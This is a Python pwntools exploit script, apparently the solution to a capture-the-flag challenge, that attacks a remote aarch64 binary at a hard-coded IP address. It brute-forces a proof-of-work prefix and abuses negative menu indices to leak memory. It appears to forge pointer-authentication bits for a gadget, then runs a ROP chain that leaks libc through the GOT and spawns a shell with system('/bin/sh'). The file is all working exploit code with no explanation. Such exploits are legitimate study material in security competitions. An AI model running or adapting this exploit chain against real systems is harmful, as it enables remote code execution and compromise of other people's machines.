#!/usr/bin/python

from hashlib import *
from pwn import *
from pwnlib.util.iters import mbruteforce
import sys

remote_ip, port = '52.255.184.147', 8080
binary = './chall'
brkpts = '''
b *0x400c08
'''

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "aarch64"
#context.log_level = "debug"
#context.aslr = False

global io

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

libc = ELF("./lib/libc.so.6")

def add(iden):
    sla(">> ","1")
    sla("identity: ",str(iden))

def lock(idx):
    sla(">> ","2")
    sla("idx: ",str(idx))

def show():
    sla(">> ","3")

def auth(idx):
    sla(">> ","4")
    sla("idx: ",str(idx))

def sanitize(inp):
    payload = list(inp)
    payload[6] = "\x30"
    return "".join([i for i in payload])

def conv(inp, out):
    bi = bin(inp).strip().replace('0b','').rjust(64,'0')
    ni = [bi[i:i+8] for i in range(0, len(bi), 8)]
    ni = ni[::-1]

    bo = bin(out).strip().replace('0b','').rjust(64,'0')
    no = [bo[i:i+8] for i in range(0, len(bo), 8)]
    no = no[::-1]
    # print(no)

    d1 = int(ni[3][7-0])
    d2 = int(ni[3][7-1])
    d3 = int(ni[3][7-2])
    d4 = int(ni[3][7-3])
    d5 = int(ni[3][7-4])
    d6 = int(ni[3][7-5])
    d7 = int(ni[3][7-6])
    d8 = int(ni[3][7-7])

    c1 = int(ni[2][7-0])
    c2 = int(ni[2][7-1])
    c3 = int(ni[2][7-2])
    c4 = int(ni[2][7-3])
    c5 = int(ni[2][7-4])
    c6 = int(ni[2][7-5])
    c7 = int(ni[2][7-6])
    c8 = int(ni[2][7-7])

    y7 = d7^c8
    y6 = d6^c7
    y5 = d5^c6
    y4 = d4^c5
    y3 = d3^c4
    y2 = d2^c3
    y1 = d1^c2

    g1 = y4^d8
    g2 = y2^d7
    g3 = y3^d6
    g4 = y1^d5

    r7=int(no[7][2])
    r6=int(no[7][3])
    r5=int(no[7][4])
    r4=int(no[7][5])
    r3=int(no[7][6])
    r2=int(no[7][7])
    r1=int(no[6][0])

    p7 = y7 ^ r7
    p6 = y6 ^ r6
    p5 = y5 ^ r5
    p4 = g1 ^ r4
    p3 = g2 ^ r3
    p2 = g3 ^ r2
    p1 = g4 ^ r1

    return (int(str(p7)+str(p6)+str(p5)+str(p4)+str(p3)+str(p2)+str(p1), 2) << 48) | inp

puts_plt = 0x4006c0
pop_x0 = 0x400a20
pattern = 0x400db8
printf_got = 0x411fe0
vuln = 0x400bdc
gadget1 = 0x400fd8
gadget2 = 0x400ff8
name_addr = 0x412030
main = 0x400e84
puts_code = 0x400e20
printf_code = 0x400978

def bruteforce(pt, ct):
    hashtype = sha256
    pt = pt.decode()
    digest = ct.decode()
    prefix = mbruteforce(
        lambda x: hashtype((x+pt).encode()).hexdigest() == digest,
        string.ascii_letters+string.digits,
        length = 4,
        method = "fixed"
    )
    return prefix

def poc(io):
    pt, ct = io.recvuntil('xxxx:\n')[:-15].split(' == ')
    io.sendline(bruteforce(pt[12:-1],ct))

def pwn(io):
    name = p64(gadget2)
    name += p64(0)
    name += p64(0x10A9FC70042)
    name += p64(0)
    io.sendafter("input your name: ",name)
    lock(-2)
    show()
    io.recvuntil("name: ")
    leak2 = u64(io.recv(8))
    new_gadget = conv(gadget2, leak2)
    log.info("New gadget -> "+hex(new_gadget))
    add(puts_plt)
    lock(-1)
    auth(-1)
    payload = "a"*0x28
    payload += flat([
        new_gadget, #pc
        0, #x29
        gadget1, #x30
        0, #x19
        1, #x20
        name_addr + 0x20, #x21
        printf_got, #x22
        printf_got, #x23
        printf_got, #x24
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main,
        main
    ])
    io.send(payload)
    libc.address = u64((io.recv(3)+"\x00\x40").ljust(8,"\x00")) - libc.symbols['printf']
    log.info("Libc base -> "+hex(libc.address))

    system = libc.symbols['system']
    binsh = next(libc.search("/bin/sh"))

    log.info("System -> "+hex(system))
    log.info("Binsh -> "+hex(binsh))

    libcgadget = libc.address + 0x63c0c

    name = p64(gadget2)
    name += p64(0)
    name += p64(0x10A9FC70042)
    name += p64(0)
    io.sendafter("input your name: ",name)
    lock(-2)
    show()
    io.recvuntil("name: ")
    leak2 = u64(io.recv(8))
    new_gadget = conv(gadget2, leak2)
    log.info("New gadget -> "+hex(new_gadget))
    add(puts_plt)
    lock(-1)
    auth(-1)
    payload = "a"*0x28
    payload += flat([
        new_gadget, #pc
        0, #x29
        gadget1, #x30
        0, #x19
        1, #x20
        name_addr + 0x20, #x21
        printf_got, #x22
        printf_got, #x23
        printf_got, #x24
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        libcgadget,
        system,
        system,
        binsh,
        binsh
    ])
    io.send(payload)
    log.info("System -> "+hex(system))
    log.info("Binsh -> "+hex(binsh))
    log.info("Gadget -> "+hex(libcgadget))

    io.interactive()

if __name__ == "__main__":
    #io = gdb.debug(binary, brkpts, env = {"LD_PRELOAD" : "./lib/libc.so.6"})
    io = remote(remote_ip, port)
    poc(io)
    pwn(io)